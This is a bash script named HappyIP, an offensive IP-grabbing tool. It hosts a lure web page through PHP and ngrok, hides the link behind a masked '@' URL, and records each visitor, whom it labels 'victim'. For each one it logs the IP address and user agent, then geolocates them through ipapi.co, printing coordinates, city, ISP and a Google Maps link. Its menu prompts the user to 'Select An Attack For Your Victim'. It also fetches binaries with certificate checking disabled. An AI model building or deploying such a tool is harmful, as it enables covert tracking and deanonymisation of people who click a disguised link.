#!/bin/bash
#HappyIP
#Coded by Z3R07-RED on Apr 17 2021
#
##VARIABLES:
termux_path="/data/data/com.termux/files/usr/bin"
kali_linux_path="/usr/bin"
## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

#universal_functions && universal_variables
if [[ -f "CS07/universal_functions" && -f "CS07/universal_variables" ]]; then
    source "CS07/universal_functions"
    source "CS07/universal_variables"
else
    echo -e "[ERROR]: \"universal_functions\", \"universal_variables\""
    echo "";exit 0
fi
#colors
if [[ -f "$colors" ]]; then
    source "$colors"
else
    unexpected_error
fi

#Directory
# if [[ ! -d "$log_directory" ]]; then
#    mkdir "$log_directory"
# fi

#Directory
# if [[ ! -d "$tmp_directory" ]]; then
#    mkdir "$tmp_directory"
# fi

## Directories
if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi
if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi

## Script termination
exit_on_signal_SIGINT() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
    exit 0
}

exit_on_signal_SIGTERM() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
    exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
    return
}

## Kill already running process
kill_pid() {
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	fi
	if [[ `pidof ngrok` || `pidof ngrok2` ]]; then
		killall ngrok > /dev/null 2>&1 || killall ngrok2 > /dev/null 2>&1
	fi	
}

#FUNCTIONS:
function ncurses_utils(){
if [ ! "$(command -v tput)" ]; then
	echo -e "\n${Y}[I]${W} apt install ncurses-utils ...${W}"
	apt install ncurses-utils -y > /dev/null 2>&1
	sleep 1
fi
}

function banner(){
    cat "CS07/banner/banner03" 2>/dev/null
    echo ""
    echo "${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by $author (Club Secreto 07) ${WHITE}"
}

function banner_small(){
    cat "CS07/banner/banner04" 2>/dev/null
    echo ""
    echo "${GREEN}[${WHITE}-${GREEN}]${CYAN} (Club Secreto 07) ${WHITE}"

}

# dependencies
function dependencies(){
if [[ -d "$kali_linux_path" ]]; then
    ZEROAPT="apt-get"
else
    ZEROAPT="apt"
	ncurses_utils
fi

tput civis; counter_dn=0
echo $(clear);sleep 0.3

pkgs=(php curl wget unzip) # dependencies
for program in "${pkgs[@]}"; do
    if [ ! "$(command -v $program)" ]; then
        echo -e "\n${R}[X]${W}${C} $program${Y} is not installed.${W}"
        sleep 0.8
        echo -e "\n\e[1;33m[i]\e[0m${C} Installing ...${W}"
        $ZEROAPT install $program -y > /dev/null 2>&1
        echo -e "\n\e[1;32m[V]\e[0m${C} $program${Y} installed.${W}"
        sleep 1
        let counter_dn+=1
    fi
done

if [[ $counter_dn != 0 ]]; then
    echo -e "\n${C}$program_name${W}"
    echo -e "\n${G}Coded by $author on $making${W}"
    sleep 2; echo $(clear)
fi

tput cnorm
}

## Download Ngrok
download_ngrok() {
	url="$1"
	file=`basename $url`
	if [[ -e "$file" ]]; then
		rm -rf "$file"
	fi
	wget --no-check-certificate "$url" > /dev/null 2>&1
	if [[ -e "$file" ]]; then
		unzip "$file" > /dev/null 2>&1
		mv -f ngrok .server/"$2" > /dev/null 2>&1
		rm -rf "$file" > /dev/null 2>&1
		chmod +x .server/"$2" > /dev/null 2>&1
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Ngrok manually."
		{ reset_color; exit 1; }
	fi
}

## Install ngrok
install_ngrok() {
	if [[ -e ".server/ngrok" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip' 'ngrok'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip' 'ngrok'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip' 'ngrok'
		else
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip' 'ngrok'
		fi
	fi

	if [[ -e ".server/ngrok2" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok patch already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok patch..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download_ngrok 'https://bin.equinox.io/a/e93TBaoFgZw/ngrok-2.2.8-linux-arm.zip' 'ngrok2'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download_ngrok 'https://bin.equinox.io/a/nmkK3DkqZEB/ngrok-2.2.8-linux-arm64.zip' 'ngrok2'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download_ngrok 'https://bin.equinox.io/a/kpRGfBMYeTx/ngrok-2.2.8-linux-amd64.zip' 'ngrok2'
		else
			download_ngrok 'https://bin.equinox.io/a/4hREUYJSmzd/ngrok-2.2.8-linux-386.zip' 'ngrok2'
		fi
	fi
}

## Exit message
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
	{ reset_color; exit 0; }
}

about(){
{ clear; banner; echo; }
cat <<- EOF
		${GREEN}Author   ${RED}:  ${ORANGE}$author ${RED}[ ${ORANGE}Club Secreto 07 ${RED}]
		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/Z3R07-RED
		${GREEN}YouTube  ${RED}:  ${CYAN}https://youtube.com/channel/UC9RNHWC3CFapIkmmXS8qYDQ
		${GREEN}Version  ${RED}:  ${ORANGE}$version
EOF
echo ""; exit 0
}

setup_site() {
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
	cp -rf .sites/"$website"/* .server/www
	cp -f .sites/ip.php .server/www/
    if [[ -n "$TITLE" ]]; then
        sed -i "s/HappyIP/${TITLE}/g" .server/www/happyip.html 2>/dev/null
    fi

    if [[ -n "$WEBPAGE" ]]; then
        sed -i "3a header('Location: $WEBPAGE');" .server/www/index.php 2>/dev/null
        sed -i "3d" .server/www/index.php 2>/dev/null
    fi
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
}

######################################

## Get IP address
capture_ip() {
	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
    User_Agent=$(grep -a 'User-Agent:' .server/www/ip.txt | cut -d "=" -f2 2>/dev/null | tr -d '\r')
    DATEU=$(grep -a 'Date:' .server/www/ip.txt | cut -d " " -f2 2>/dev/null | tr -d '\r')
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN}  User-Agent : ${BLUE}$User_Agent"
    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN}        Date : ${BLUE}$DATEU"
	cat .server/www/ip.txt >> ip.txt

    wget https://ipapi.co/${IP}/yaml/ -o process 2>/dev/null

    if [[ -f "index.html" && -s "index.html" ]]; then
        sleep 0.2
        LATITUDE=$(cat index.html | grep "latitude:" | cut -d "'" -f2)
        echo -e "${RED}[${WHITE}-${RED}]${GREEN}    Latitude : ${BLUE}$LATITUDE"
        sleep 0.2
        LONGITUDE=$(cat index.html | grep "longitude:" | cut -d "'" -f2)
        echo -e "${RED}[${WHITE}-${RED}]${GREEN}   Longitude : ${BLUE}$LONGITUDE"
        sleep 0.2
        ASN=$(cat index.html | grep "asn:" | cut -d ":" -f2)
        echo -e "${RED}[${WHITE}-${RED}]${GREEN}         ASN : ${BLUE}$ASN"
        sleep 0.2
        CITY=$(cat index.html | grep "city:" | cut -d ":" -f2)
        echo -e "${RED}[${WHITE}-${RED}]${GREEN}        City : ${BLUE}$CITY"
        sleep 0.2
        CCC=$(cat index.html | grep "country_calling_code:" | cut -d "'" -f2)
        echo -e "${RED}[${WHITE}-${RED}]${GREEN}    CCC code : ${BLUE}$CCC"
        sleep 0.2
        COUNTRY_NAME=$(cat index.html | grep "country_name:" | cut -d ":" -f2)
        echo -e "${RED}[${WHITE}-${RED}]${GREEN} Country Name: ${BLUE}$COUNTRY_NAME"
        sleep 0.2
        CURRENCY=$(cat index.html | grep "currency:" | cut -d ":" -f2)
        echo -e "${RED}[${WHITE}-${RED}]${GREEN}    Currency : ${BLUE}$CURRENCY"
        sleep 0.2
        LANGUAGES=$(cat index.html | grep "languages:" | cut -d ":" -f2)
        echo -e "${RED}[${WHITE}-${RED}]${GREEN}   Languages : ${BLUE}$LANGUAGES"
        sleep 0.2
        ISP=$(cat index.html | grep "org:" | cut -d ":" -f2)
        echo -e "${RED}[${WHITE}-${RED}]${GREEN}         ISP : ${BLUE}$ISP"
        sleep 0.2
        REGION=$(cat index.html | grep "region:" | cut -d ":" -f2)
        echo -e "${RED}[${WHITE}-${RED}]${GREEN}      Region : ${BLUE}$REGION"
        sleep 0.2
        TIMEZONE=$(cat index.html | grep "timezone:" | cut -d ":" -f2)
        echo -e "${RED}[${WHITE}-${RED}]${GREEN}   Time Zone : ${BLUE}$TIMEZONE"
        sleep 0.2
        COUNTRY_CAPITAL=$(cat index.html | grep "country_capital:" | cut -d ":" -f2)
        echo -e "${RED}[${WHITE}-${RED}]${GREEN}     Capital : ${BLUE}$COUNTRY_CAPITAL"
        sleep 0.2
        COUNTRY_POPULATION=$(cat index.html | grep "country_population:" | cut -d ":" -f2)
        echo -e "${RED}[${WHITE}-${RED}]${GREEN}  Population : ${BLUE}$COUNTRY_POPULATION"
        sleep 0.2
        CURRENCY_NAME=$(cat index.html | grep "currency_name:" | cut -d ":" -f2)
        echo -e "${RED}[${WHITE}-${RED}]${GREEN}Currency Name: ${BLUE}$CURRENCY_NAME"
        sleep 0.2
        GML=$(echo -e "https://maps.google.com/?q=${LATITUDE},${LONGITUDE}")
        echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} GOOGLE MAPS LOCATION : ${WHITE}$GML"
        echo "" >> ip.txt 2>/dev/null
        cat index.html >> ip.txt 2>/dev/null
        rm -rf index.html 2>/dev/null
        rm process 2>/dev/null
    fi

    echo -e "\n-----------------------------------------------" >> ip.txt 2>/dev/null
    echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE}    Saved in : ${ORANGE}ip.txt"
}

## Print data
capture_data() {
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75	
	done
}

## Start ngrok
start_ngrok() {
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} $2"
	sleep 2 && ./.server/"$1" http "$HOST":"$PORT" > /dev/null 2>&1 &
	{ sleep 8; clear; banner_small; }
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
	ngrok_url1=${ngrok_url#https://}
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
	capture_data
}

## Start localhost
start_localhost() {
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	setup_site
	{ sleep 1; clear; banner_small; }
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
	capture_data
}

## Tunnel selection
tunnel_menu() {
	{ clear; banner_small; }
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Localhost ${RED}[${CYAN}For Devs Only${RED}]
		${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io  ${RED}[${CYAN}Hotspot Required${RED}]
		${RED}[${WHITE}03${RED}]${ORANGE} Ngrok.io  ${RED}[${CYAN}Without Hotspot${RED}]

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		start_localhost
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		start_ngrok "ngrok" "Launching Ngrok... Turn on Hotspot..."
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		start_ngrok "ngrok2" "Launching Ngrok Patched..."
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; tunnel_menu; }
	fi
}

function happy_ip_config(){
# echo $(clear); banner
TITLE=""
if [[ "$website" == "happy" ]]; then
    echo -e "\n${GREEN}-----------------------------------------------------${W}"
    echo -e "${RED}[${WHITE}::${RED}]${ORANGE} ENTER A TITLE FOR THE WEBSITE ${RED}[${WHITE}::${RED}]${WHITE}"
    sleep 0.3
    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter a title:${BLUE} \c"
    while read TITLE && [ -z $TITLE ]; do
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter a title:${BLUE} \c"
    done

    if [[ -z "$TITLE" ]]; then
        unexpected_error
    fi
fi

WEBPAGE=""
if [[ "$website" == "happy2" ]]; then
    echo -e "\n${GREEN}-----------------------------------------------------${W}"
    echo -e "${RED}[${WHITE}::${RED}]${ORANGE} LINK OF A WEB PAGE ${RED}[${WHITE}::${RED}]${WHITE}"
    sleep 0.3
    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Link a web page:${BLUE} \c"
    while read WEBPAGE && [ -z $WEBPAGE ]; do
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Link a web page:${BLUE} \c"
    done

    if [[ -z "$WEBPAGE" ]]; then
        unexpected_error
    fi
fi
}

function main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}

		${RED}[${WHITE}01${RED}]${ORANGE} HappyIP       ${RED}[${WHITE}02${RED}]${ORANGE} WhiteLink

		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit

	EOF
	
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="happy"
        happy_ip_config
        tunnel_menu
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="happy2"
        happy_ip_config
        tunnel_menu
	elif [[ "$REPLY" == 9 || "$REPLY" == 99 ]]; then
		about
	elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
        msg_exit
    else
        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; main_menu; }
    fi
}

########################################################################################################################################################


kill_pid
internet_connection
dependencies
install_ngrok
main_menu


